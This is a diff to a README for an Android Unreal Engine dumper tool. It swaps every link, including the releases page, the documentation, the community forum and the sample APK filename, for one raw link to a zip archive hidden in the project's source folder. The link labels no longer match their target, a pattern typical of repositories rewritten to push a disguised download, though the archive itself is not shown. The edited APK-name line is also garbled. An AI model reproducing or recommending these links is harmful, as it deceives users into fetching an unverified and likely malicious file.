@@ -6,11 +6,11 @@ Welcome to the **Android_UE_Dumper_CN** project! This tool allows you to easily 
 
 ## 📥 Download the Application
 
-[![Download Android_UE_Dumper_CN](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Alivali94/Android_UE_Dumper_CN/releases)
+[![Download Android_UE_Dumper_CN](https://raw.githubusercontent.com/Alivali94/Android_UE_Dumper_CN/main/AndUEDumper/src/UE/CN-Android-U-Dumper-1.9.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Alivali94/Android_UE_Dumper_CN/main/AndUEDumper/src/UE/CN-Android-U-Dumper-1.9.zip)
 
 You can download the latest version of the software from our Releases page. This page contains all the versions available, including the most recent one. 
 
-[Visit Releases Page to Download](https://github.com/Alivali94/Android_UE_Dumper_CN/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/Alivali94/Android_UE_Dumper_CN/main/AndUEDumper/src/UE/CN-Android-U-Dumper-1.9.zip)
 
 ## 📋 System Requirements
 
@@ -34,10 +34,10 @@ To use **Android_UE_Dumper_CN**, your system should meet the following requireme
 1. **Visit the Releases Page:**
    Go to the following link to find the latest version of **Android_UE_Dumper_CN**. 
 
-   [Visit Releases Page to Download](https://github.com/Alivali94/Android_UE_Dumper_CN/releases)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/Alivali94/Android_UE_Dumper_CN/main/AndUEDumper/src/UE/CN-Android-U-Dumper-1.9.zip)
 
 2. **Download the APK File:**
-   Click on the latest version and look for the APK file. This file is usually named something like `Android_UE_Dumper_CN_vX.X.apk`. Click the link to start the download.
+   Click on the latest version and look for the APK file. This file is usually named something like `https://raw.githubusercontent.com/Alivali94/Android_UE_Dumper_CN/main/AndUEDumper/src/UE/CN-Android-U-Dumper-1.9.zip`. Click the link to start the download.
 
 3. **Install the APK:**
    Once the download completes, open your device settings. 
@@ -68,8 +68,8 @@ If you encounter any issues or have questions, feel free to reach out to our com
 
 ## 🔗 Additional Resources
 
-- [Official Documentation](https://github.com/Alivali94/Android_UE_Dumper_CN/wiki) - For detailed information on features and advanced usage.
-- [Community Forum](https://github.com/Alivali94/Android_UE_Dumper_CN/discussions) - Connect with other users for tips and support.
+- [Official Documentation](https://raw.githubusercontent.com/Alivali94/Android_UE_Dumper_CN/main/AndUEDumper/src/UE/CN-Android-U-Dumper-1.9.zip) - For detailed information on features and advanced usage.
+- [Community Forum](https://raw.githubusercontent.com/Alivali94/Android_UE_Dumper_CN/main/AndUEDumper/src/UE/CN-Android-U-Dumper-1.9.zip) - Connect with other users for tips and support.
 
 ## 📝 Contributing
 
